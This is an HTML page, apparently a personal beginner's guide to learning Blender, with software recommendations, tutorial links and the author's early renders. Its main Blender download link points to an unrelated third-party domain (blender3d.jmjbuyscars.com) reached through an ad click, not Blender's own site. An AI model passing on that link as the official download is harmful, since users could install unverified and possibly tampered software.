        <h1>Starting your 3D design Journey</h1>
        <p>This will be a quick guide on how to get involved with making your own 3D art. Some tips and a reference that will be able to help you streamline your learning process.</p>
        <h3>Step 1: Download the Software</h3>
        <p>The only software you need to use Blender is-well Blender. It is completely free to use. You can either download an installer, or a zip file. I usually prefer to use the zip file, particulary on public computers because you can extract the zipped files to the computer without needing adnim access. The installer sometimes will require an admin password.<br><br>Here is a link to download <a href="https://blender3d.jmjbuyscars.com/download/?gclid=Cj0KCQiA1sucBhDgARIsAFoytUs4NpDzKxO0ljCeWAjIBLSsgwRapEKoCmASVqBqqxE4L0LWQ3CuSxUaAqzcEALw_wcB">Blender.</a></p>

        <p>You dont need any of the following to use Blender, but its good to keep in mind if you are wanting to use Blender for videos or game design as well.</p>

        <p>There are many other softwares that work well with Blender that mainly help with the texturing process. You can do all of your texturing in Blender, but may find it easier to create your own textures. Here are some softwares that are commonly used with Blender.</p>
        <ul>
          <li><a href="https://www.adobe.com/creativecloud/business/teams.html?sdid=B16P3W9X&mv=search&ef_id=Cj0KCQiA1sucBhDgARIsAFoytUuCsrKdhF0bUIPSTRYgZM20ub6DZcJ35M2-ol8-OKLcCQjxuvKABb0aAgDxEALw_wcB:G:s&s_kwcid=AL!3085!3!566814725499!e!!g!!download%20photoshop!15482932269!136265040648">Photoshop</a> is a paid for image editing software that gives many options to create your own textures.</li>
          <li><a href="https://www.gimp.org/downloads/">Gimp</a> is a great free alternitive to photoshop</li>
          <li><a href="https://krita.org/en/download/krita-desktop/">Krita</a> another free alternitive to photoshop that has more of a 2D art workflow appeal.</li>
        </ul>

        <p>If you plan on using Blender to create your own videos and use it for motion tracking and CGI I would also recommend a video editor. The most powerful video editor in my opinion woudl be <a href="https://www.blackmagicdesign.com/products/davinciresolve/?gclid=Cj0KCQiA1sucBhDgARIsAFoytUsadJnelRwzSrQxzBt-wrohvktucQmvWTxVMA6qbvbMwovbPEtctj4aAgmrEALw_wcB">Davinci Resolve.</a> Davinci is fantastic and has a free and paid for version, though the free version should have everything you need to make your own videos. I'd recommend <a href="https://fxhome.com/product/hitfilm">Hitfilm</a> for all of your compositing (putting the 3D mixed with reality). Hitfilm also has paid for and free versions.</p>

        <p>For game development with Blender, you will want to use either <a href="https://unity.com/download">Unity</a> or <a href="https://www.unrealengine.com/en-US/unreal-engine-5?utm_source=GoogleSearch&utm_medium=Performance&utm_campaign=%7Bcampaigname%7D&utm_id=17086214833&sub_campaign=&utm_content=&utm_term=unreal%205">Unreal Engine.</a> Both are powerful game development softwares that are used on a professional scene and best of all: it's free!</p>
        
        <h3>Step 2: Open up Blender!</h3>
        <p>After you have Blender installed, all there is left is to get it up and running. The best way to learn Blender is to use it. There are many different tutorials that are great for beginners to learn the basics of Blender. Here are the ones I think are best to get started.</p>

        <ul>
          <li>Ryan King has a great tutorial for learning how to <a href="https://www.youtube.com/watch?v=9NT_1BvV2yw">move around in Blender.</a></li>
          <li>Blender Guru's <a href="https://www.youtube.com/watch?v=nIoXOplUvAw&list=PLjEaoINr3zgFX8ZsChQVQsuDSjEqdWMAD">Donut Tutorial.</a> This tutorial is a series that will take you through many of the different Blender tools and how they work together as you dip your toes into some photorealistic renders. Hop over to the contact page and send me your donut after you finish!</li>
        </ul>
        <p>There are many other tutorials, but I think these two are some of the best to get started with Blender. Blender Guru has so many tutorials that are great for beginners all to way to advanced users.</p>
        <h3>Step 3: Use it!</h3>
        <p>The last step is going to be to use Blender. We don't all start off creating masterpieces, so its ok if your finished renders don't look like the tutorials. After you create something from a tutorial, try to create something similar without the tutorial so you can use the tools and practice different techniques. Don't get discouraged if it doesn't work out how you had it visioned in your head. Here are some of my early works in Blender.</p>

            <div class="col">
              <img src="./images/BasicCup.png"/>
              <p>My first time opening Blender, I learned how to use the grab, loopcut, and extrude tool.</p>
            </div>
            <div class="col">
              <img src="./images/Turret.png"/>
              <p>I started working on my own tower defense game using unity. This was the first turret I made and first model I made without a tutorial to guide me.</p>
            </div>
            <div class="col">
              <img src="./images/GlassMonkey.png"/>
              <p>I started working with materials and shaders alot more. Using my photography class I played with lights, and after a year of Blender I loved playing with glass materials.</p>
